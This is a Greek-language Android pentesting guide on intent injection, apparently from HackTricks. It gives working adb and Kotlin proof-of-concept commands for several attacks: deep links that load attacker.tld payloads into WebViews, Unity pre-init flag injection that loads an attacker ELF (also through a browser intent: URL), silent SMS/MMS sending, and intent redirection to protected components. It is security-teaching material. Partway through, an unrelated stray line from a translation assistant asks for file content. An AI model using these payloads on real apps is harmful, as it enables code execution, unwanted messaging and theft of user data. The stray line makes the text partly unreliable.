# Intent Injection

{{#include ../../banners/hacktricks-training.md}}

Το Intent injection καταχράται στοιχεία που δέχονται Intents ελεγχόμενα από επιτιθέμενο ή δεδομένα που αργότερα μετατρέπονται σε Intents. Δύο πολύ κοινά σενάρια κατά τις Android app pentests είναι:

- Αποστολή κατασκευασμένων extras σε exported Activities/Services/BroadcastReceivers που στη συνέχεια προωθούνται σε privileged, non-exported components.
- Προκαλώντας exported VIEW/BROWSABLE deep links που προωθούν URLs ελεγχόμενα από επιτιθέμενο σε internal WebViews ή άλλες ευαίσθητες sinks.

## Deep links → WebView sink (URL parameter injection)

Εάν μια εφαρμογή εκθέτει ένα custom scheme deep link όπως:
```text
myscheme://com.example.app/web?url=<attacker_url>
```
και η Activity που λαμβάνει προωθεί την παράμετρο ερωτήματος `url` σε ένα WebView, μπορείτε να εξαναγκάσετε την εφαρμογή να αποδώσει αυθαίρετο απομακρυσμένο περιεχόμενο στο πλαίσιο WebView της.

PoC via adb:
```bash
# Implicit VIEW intent
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# Or explicitly target an Activity
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Επίπτωση
- HTML/JS εκτελείται μέσα στο προφίλ WebView της εφαρμογής.
- Εάν η JavaScript είναι ενεργοποιημένη (από προεπιλογή ή λόγω λανθασμένα διατεταγμένων ελέγχων), μπορείτε να εντοπίσετε/χρησιμοποιήσετε οποιαδήποτε εκτεθειμένα `@JavascriptInterface` αντικείμενα, να κλέψετε WebView cookies/local storage και να κάνετε pivot.

Δείτε επίσης:

{{#ref}}
webview-attacks.md
{{#endref}}

## Σφάλμα σειράς ελέγχων που ενεργοποιεί την JavaScript

Ένα επαναλαμβανόμενο σφάλμα είναι η ενεργοποίηση της JavaScript (ή άλλων επιεικών ρυθμίσεων WebView) πριν ολοκληρωθεί η τελική allowlist/verification του URL. Εάν πρώιμοι helpers αποδεχτούν το deep link σας και το WebView ρυθμιστεί πρώτα, το τελικό load γίνεται με την JavaScript ήδη ενεργοποιημένη ακόμη και αν οι επακόλουθοι έλεγχοι είναι ελαττωματικοί ή πολύ αργοί.

Τι να ψάξετε σε decompiled code:
- Πολλαπλά helpers που κάνουν parse/split/rebuild το URL με διαφορετικό τρόπο (ασυνεπής normalization).
- Κλήσεις σε `getSettings().setJavaScriptEnabled(true)` πριν από τον τελευταίο host/path allowlist έλεγχο.
- Μια ροή όπως: parse → partial validate → configure WebView → final verify → loadUrl.


## Unity Runtime: Intent-to-CLI extras → pre-init native library injection (RCE)

Οι Android εφαρμογές που βασίζονται σε Unity συνήθως χρησιμοποιούν `com.unity3d.player.UnityPlayerActivity` (ή `UnityPlayerGameActivity`) ως την entry Activity. Το Android template του Unity χειρίζεται ένα ειδικό Intent extra με όνομα `unity` ως string από command-line flags για το Unity runtime. Όταν η entry Activity είναι exported (προεπιλογή σε πολλά templates), οποιαδήποτε τοπική εφαρμογή — και μερικές φορές ένας ιστότοπος αν υπάρχει `BROWSABLE` — μπορεί να προμηθεύσει αυτό το extra.

Μια επικίνδυνη, μη τεκμηριωμένη flag οδηγεί σε εκτέλεση native κώδικα σε πολύ πρώιμο στάδιο αρχικοποίησης της διεργασίας:

- Hidden flag: `-xrsdk-pre-init-library <absolute-path>`
- Effect: `dlopen(<absolute-path>, RTLD_NOW)` σε πολύ πρώιμο στάδιο init, φορτώνοντας attacker-controlled ELF μέσα στη διεργασία της στοχευόμενης εφαρμογής με το UID και τα permissions της.

Reverse-engineering excerpt (simplified):
```c
// lookup the arg value
initLibPath = FUN_00272540(uVar5, "xrsdk-pre-init-library");
// load arbitrary native library early
lVar2 = dlopen(initLibPath, 2); // RTLD_NOW
```
Γιατί λειτουργεί
- Το extra του Intent `unity` αναλύεται σε Unity runtime flags.
- Η παροχή της pre-init flag δείχνει το Unity σε ένα attacker-controlled ELF path εντός ενός επιτρεπόμενου linker namespace path (βλέπε περιορισμούς παρακάτω).

Προϋποθέσεις εκμετάλλευσης
- Η Unity entry Activity είναι exported (συνήθως true από προεπιλογή).
- Για one-click remote μέσω browser: η entry Activity δηλώνει επίσης `android.intent.category.BROWSABLE` ώστε extras να μπορούν να περαστούν από ένα `intent:` URL.

Τοπική εκμετάλλευση (ίδια συσκευή)
1) Τοποθετήστε ένα payload ELF σε ένα μονοπάτι που μπορεί να διαβαστεί από την εφαρμογή-θύμα. Το πιο εύκολο: συμπεριλάβετε μια κακόβουλη βιβλιοθήκη στη δική σας εφαρμογή επιτιθέμενου και εξασφαλίστε ότι θα εξαχθεί κάτω από `/data/app/.../lib/<abi>/` ρυθμίζοντας στο manifest του επιτιθέμενου:
```xml
<application android:extractNativeLibs="true" ...>
```
2) Εκκινήστε την Unity activity του θύματος με το CLI pre-init flag στο extra `unity`. Παράδειγμα ADB PoC:
```bash
adb shell am start \
-n com.victim.pkg/com.unity3d.player.UnityPlayerActivity \
-e unity "-xrsdk-pre-init-library /data/app/~~ATTACKER_PKG==/lib/arm64/libpayload.so"
```
3) Unity calls `dlopen("/data/.../libpayload.so", RTLD_NOW)`; το payload σας εκτελείται στη διεργασία του θύματος, κληρονομώντας όλα τα app permissions (camera/mic/network/storage κ.λπ.) και πρόσβαση σε in-app sessions/data.

Σημειώσεις
- Η ακριβής `/data/app/...` διαδρομή διαφέρει ανά συσκευή/εγκατάσταση. Μια attacker app μπορεί να ανακτήσει το δικό της native lib dir κατά το runtime μέσω `getApplicationInfo().nativeLibraryDir` και να το επικοινωνήσει στον trigger.
- Το αρχείο δεν χρειάζεται να τελειώνει με `.so` αν είναι ένα έγκυρο ELF — το `dlopen()` κοιτάει τα ELF headers, όχι τις επεκτάσεις.

Remote one‑click via browser (conditional)
Εάν η Unity entry activity είναι exported με `BROWSABLE`, μια ιστοσελίδα μπορεί να περάσει extras μέσω ενός `intent:` URL:
```text
intent:#Intent;package=com.example.unitygame;scheme=whatever;\
S.unity=-xrsdk-pre-init-library%20/data/local/tmp/malicious.so;end;
```
Ωστόσο, στα σύγχρονα Android τα dynamic linker namespaces και το SELinux εμποδίζουν τη φόρτωση από πολλούς δημόσιους φακέλους (π.χ., `/sdcard/Download`). Θα δείτε σφάλματα όπως:
```
library "/sdcard/Download/libtest.so" ("/storage/emulated/0/Download/libtest.so") needed
or dlopened by "/data/app/.../lib/arm64/libunity.so" is not accessible for the
namespace: [name="clns-...", ... permitted_paths="/data:/mnt/expand:/data/data/com.example.unitygame"]
```
Στρατηγική παράκαμψης: στοχεύστε εφαρμογές που cache-άρουν attacker-controlled bytes στο ιδιωτικό τους αποθηκευτικό χώρο (π.χ., HTTP caches). Επειδή τα επιτρεπόμενα μονοπάτια περιλαμβάνουν το `/data` και τον ιδιωτικό κατάλογο της εφαρμογής, το να δείξετε το `-xrsdk-pre-init-library` σε ένα απόλυτο μονοπάτι μέσα στην cache της εφαρμογής μπορεί να ικανοποιήσει τους περιορισμούς του linker και να οδηγήσει σε εκτέλεση κώδικα. Αυτό αντικατοπτρίζει προηγούμενα cache-to-ELF RCE μοτίβα που έχουν εμφανιστεί σε άλλες Android εφαρμογές.


## Confused‑Deputy: Silent SMS/MMS via ACTION_SENDTO (Wear OS Google Messages)

Ορισμένες προεπιλεγμένες εφαρμογές μηνυμάτων εκτελούν εσφαλμένα αυτόματα implicit messaging intents, μετατρέποντάς τες σε confused‑deputy primitive: οποιαδήποτε μη προνομιούχα εφαρμογή μπορεί να προκαλέσει `Intent.ACTION_SENDTO` με `sms:`, `smsto:`, `mms:`, ή `mmsto:` και να προκαλέσει άμεση αποστολή χωρίς UI επιβεβαίωσης και χωρίς την άδεια `SEND_SMS`.

Key points
- Trigger: implicit `ACTION_SENDTO` + messaging URI scheme.
- Data: set recipient in the URI, message text in the `"sms_body"` extra.
- Permissions: none (no `SEND_SMS`), relies on the default SMS/MMS handler.
- Observed: Google Messages for Wear OS (patched May 2025). Other handlers should be assessed similarly.

Minimal payload (Kotlin)
```kotlin
val intent = Intent(Intent.ACTION_SENDTO).apply {
data = Uri.parse("smsto:+11234567890") // or sms:, mms:, mmsto:
putExtra("sms_body", "Hi from PoC")
// From a non-Activity context add NEW_TASK
addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
}
startActivity(intent)
```
ADB PoC (χωρίς ειδικά δικαιώματα)
```bash
# SMS/SMS-to
adb shell am start -a android.intent.action.SENDTO -d "smsto:+11234567890" --es sms_body "hello"
adb shell am start -a android.intent.action.SENDTO -d "sms:+11234567890"   --es sms_body "hello"

# MMS/MMS-to (handler-dependent behaviour)
adb shell am start -a android.intent.action.SENDTO -d "mmsto:+11234567890" --es sms_body "hello"
adb shell am start -a android.intent.action.SENDTO -d "mms:+11234567890"   --es sms_body "hello"
```
Επέκταση επιφανείας επίθεσης (Wear OS)
- Οποιοδήποτε component ικανό να ξεκινήσει activities μπορεί να πυροδοτήσει το ίδιο payload: Activities, foreground Services (με `FLAG_ACTIVITY_NEW_TASK`), Tiles, Complications.
- Αν ο προεπιλεγμένος handler αποστέλλει αυτόματα, η κατάχρηση μπορεί να γίνει με ένα tap ή πλήρως αθόρυβα από background contexts ανάλογα με τις πολιτικές του OEM.

Pentest checklist
- Εντοπίστε το `ACTION_SENDTO` στον στόχο για να προσδιορίσετε τον προεπιλεγμένο handler· επαληθεύστε αν εμφανίζει compose UI ή αποστέλλει σιωπηλά.
- Δοκιμάστε και τα τέσσερα schemes (`sms:`, `smsto:`, `mms:`, `mmsto:`) και τα extras (`sms_body`, προαιρετικά `subject` για MMS) για να ελέγξετε διαφορές στη συμπεριφορά.
- Λάβετε υπόψη προορισμούς με χρέωση/αριθμούς premium‑rate όταν δοκιμάζετε σε πραγματικές συσκευές.


## Other classic Intent injection primitives

- startActivity/sendBroadcast που χρησιμοποιεί attacker-supplied `Intent` extras που στη συνέχεια επανα-αναλύονται (`Intent.parseUri(...)`) και εκτελούνται.
- Exported proxy components που προωθούν Intents σε μη‑exported ευαίσθητα components χωρίς έλεγχο δικαιωμάτων.

---

## Automating exported-component testing (Smali-driven ADB generation)

Όταν exported components περιμένουν συγκεκριμένα extras, η εικασία του σχήματος του payload προκαλεί σπατάλη χρόνου και ψευδώς αρνητικά αποτελέσματα. Μπορείτε να αυτοματοποιήσετε την ανακάλυψη των keys/types απευθείας από Smali και να παράγετε έτοιμες προς εκτέλεση adb εντολές.

Tool: APK Components Inspector
- Repo: https://github.com/thecybersandeep/apk-components-inspector
- Approach: decompile and scan Smali for calls like `getStringExtra("key")`, `getIntExtra("id", ...)`, `getParcelableExtra("redirect_intent")`, `getSerializableExtra(...)`, `getBooleanExtra(...)`, `getAction()`, `getData()` to infer which extras and fields are consumed by each component.
- Output: for every exported Activity/Service/Receiver/Provider, the tool prints a short explanation and the exact `adb shell am ...`/`cmd content ...` command with correctly typed flags.

Εγκατάσταση
```bash
git clone https://github.com/thecybersandeep/apk-components-inspector
cd apk-components-inspector
python3 -m venv venv && source venv/bin/activate
pip install androguard==3.3.5 rich
```
Χρήση
```bash
python apk-components-inspector.py target.apk
```
I don't have the file content. Please paste the contents of src/mobile-pentesting/android-app-pentesting/intent-injection.md here (or provide the text you want translated) and I will translate the English parts to Greek, preserving all markdown/html, code, links, paths and tags exactly as requested.
```bash
adb shell am start -n com.target/.ExportedActivity --es url https://example.tld
adb shell am startservice -n com.target/.ExportedService --ei user_id 1337 --ez force true
adb shell am broadcast -n com.target/.ExportedReceiver -a com.target.ACTION --es redirect_intent "intent:#Intent;component=com.target/.Internal;end"
adb shell cmd content query --uri content://com.target.provider/items
```
Cheat sheet για ADB am extras (flags ανά τύπο)
- Συμβολοσειρές: `--es key value` | Πίνακας συμβολοσειρών: `--esa key v1,v2`
- Ακέραιοι: `--ei key 123` | Πίνακας ακεραίων: `--eia key 1,2,3`
- Boolean τιμές: `--ez key true|false`
- Longs: `--el key 1234567890`
- Floats: `--ef key 1.23`
- URIs (extra): `--eu key content://...` | Data URI (Intent data): `-d content://...`
- Component extra: `--ecn key com.pkg/.Cls`
- Null string extra: `--esn key`
- Κοινά flags: `-a <ACTION>` `-c <CATEGORY>` `-t <MIME>` `-f <FLAGS>` `--activity-clear-task --activity-new-task`

Pro tips για Providers
- Χρησιμοποιήστε `adb shell cmd content query|insert|update|delete ...` για να προσπελάσετε ContentProviders χωρίς agents.
- Για SQLi probing, διαφοροποιήστε τα `--projection` και `--where` (aka selection) όταν ο υποκείμενος provider είναι SQLite-backed.

Πλήρης αυτοματοποίηση pipeline (interactive executor)
```bash
# generate and capture commands then execute them one by one interactively
python apk-components-inspector.py app.apk | tee adbcommands.txt
python run_adb_commands.py
```
<details>
<summary>Βοηθητικό script για ανάλυση και εκτέλεση εντολών adb</summary>
```python
import subprocess

def parse_adb_commands(file_path):
with open(file_path, 'r') as file:
lines = file.readlines()
commands = []
current = []
for line in lines:
s = line.strip()
if s.startswith("adb "):
current = [s]
elif s.startswith("#") or not s:
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
current = []
elif current:
current.append(s)
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
return commands

for i, cmd in enumerate(parse_adb_commands('adbcommands.txt'), 1):
print(f"\nCommand {i}: {cmd}")
input("Press Enter to execute this command...")
try:
r = subprocess.run(cmd, shell=True, check=True, text=True, capture_output=True)
print("Output:\n", r.stdout)
if r.stderr:
print("Errors:\n", r.stderr)
except subprocess.CalledProcessError as e:
print(f"Command failed with error:\n{e.stderr}")
```
</details>

Εκτέλεση στη συσκευή: ο inspector είναι Python-based και λειτουργεί σε Termux ή rooted phones όπου είναι διαθέσιμα τα `apktool`/`androguard`.

---

## Intent Redirection (CWE-926) – εύρεση και εκμετάλλευση

Πρότυπο
- Ένα exported entry point (Activity/Service/Receiver) διαβάζει ένα εισερχόμενο Intent και το προωθεί εσωτερικά ή εξωτερικά χωρίς να επαληθεύει το source/data, π.χ.:
- `startActivity(getIntent())`
- `startActivity(intent)` όπου το `intent` προήλθε από ένα extra όπως `redirect_intent`/`next_intent`/`pending_intent` ή `Intent.parseUri(...)`.
- Εμπιστοσύνη στα πεδία `action`/`data`/`component` χωρίς ελέγχους· μη επαλήθευση της ταυτότητας του caller.

Τι να αναζητήσετε σε Smali/Java
- Χρήσεις του `getParcelableExtra("redirect_intent")`, `getParcelable("intent")`, `getIntent().getParcelableExtra(...)`.
- Άμεσες κλήσεις `startActivity(...)`, `startService(...)`, `sendBroadcast(...)` σε attacker-influenced Intents.
- Έλλειψη ελέγχων `getCallingPackage()`/`getCallingActivity()` ή custom permission gates.

Πρότυπα ADB PoC
- Proxy Activity που προωθεί ένα extra Intent σε ένα privileged internal Activity:
```bash
adb shell am start -n com.target/.ProxyActivity \
--es redirect_intent 'intent:#Intent;component=com.target/.SensitiveActivity;end'
```
- Εξαγόμενο Service που υποστηρίζει ένα `redirect_intent` parcelable:
```bash
adb shell am startservice -n com.target/.ExportedService \
--es redirect_intent 'intent:#Intent;component=com.target/.PrivService;action=com.target.DO;end'
```
- Exported Receiver που προωθεί χωρίς επικύρωση:
```bash
adb shell am broadcast -n com.target/.RelayReceiver -a com.target.RELAY \
--es forwarded 'intent:#Intent;component=com.target/.HiddenActivity;S.extra=1;end'
```
Σημαίες χρήσιμες για συμπεριφορά τύπου singleTask
```bash
# Ensure a fresh task when testing Activities that check task/intent flags
adb shell am start -n com.target/.ExportedActivity --activity-clear-task --activity-new-task
```
Πραγματικά παραδείγματα (το αντίκτυπο διαφέρει):
- CVE-2024-26131 (Element Android): εξαγόμενες ροές που οδηγούν σε χειραγώγηση WebView, παράκαμψη PIN, login hijack.
- CVE-2023-44121 (LG ThinQ Service): εξαγόμενη ενέργεια του receiver `com.lge.lms.things.notification.ACTION` → επιπτώσεις σε επίπεδο συστήματος.
- CVE-2023-30728 (Samsung PackageInstallerCHN < 13.1.03.00): ανακατεύθυνση → πρόσβαση σε αυθαίρετα αρχεία (με αλληλεπίδραση χρήστη).
- CVE-2022-36837 (Samsung Email < 6.1.70.20): implicit Intents leak content.
- CVE-2021-4438 (React Native SMS User Consent).
- CVE-2020-14116 (Xiaomi Mi Browser).


---

## References

- [Android – Access to app-protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Walkthrough](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 attack chain (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Demonstration video](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Automating Android App Component Testing with New APK Inspector (blog)](https://www.mobile-hacker.com/2025/09/18/automating-android-app-component-testing-with-new-apk-inspector/)
- [APK Components Inspector – GitHub](https://github.com/thecybersandeep/apk-components-inspector)
- [Google guidance on intent redirection](https://support.google.com/faqs/answer/9267555?hl=en)
- [OVAA vulnerable app](https://github.com/oversecured/ovaa)
- [Exported Service PoC APK](https://github.com/nhattm3006/android-poc/blob/main/Exported%20Service/poc.apk)
- [Ostorlab – 100M installs image app deep dive (component summary example)](https://medium.com/@ostorlab/this-article-is-a-technical-deep-dive-showing-how-a-100m-installation-image-application-can-6343ce8ea076)
- [CVE-2024-26131 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-26131)
- [CVE-2023-44121 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-44121)
- [CVE-2023-30728 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-30728)
- [CVE-2022-36837 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2022-36837)
- [CVE-2021-4438 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-4438)
- [CVE-2020-14116 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-14116)
- [CVE-2025-59489 – Arbitrary Code Execution in Unity Runtime (blog)](https://flatt.tech/research/posts/arbitrary-code-execution-in-unity-runtime/)
- [Unity docs – Android custom activity command-line](https://docs.unity3d.com/6000.0/Documentation/Manual/android-custom-activity-command-line.html)
- [Unity Security Sept-2025-01 advisory](https://unity.com/security/sept-2025-01)
- [HEXACON talk – Messenger one-click cache-based RCE pattern (slides)](https://www.hexacon.fr/slides/Calvanno-Defense_through_Offense_Building_a_1-click_Exploit_Targeting_Messenger_for_Android.pdf)
- [CVE-2025-12080 — Intent Abuse in Google Messages for Wear OS](https://towerofhanoi.it/writeups/cve-2025-12080/)
- [PoC repo – io-no/CVE-2025-12080](https://github.com/io-no/CVE-Reports/tree/main/CVE-2025-12080)
- [Android docs – Intents and Intent Filters](https://developer.android.com/guide/components/intents-filters)


{{#include ../../banners/hacktricks-training.md}}
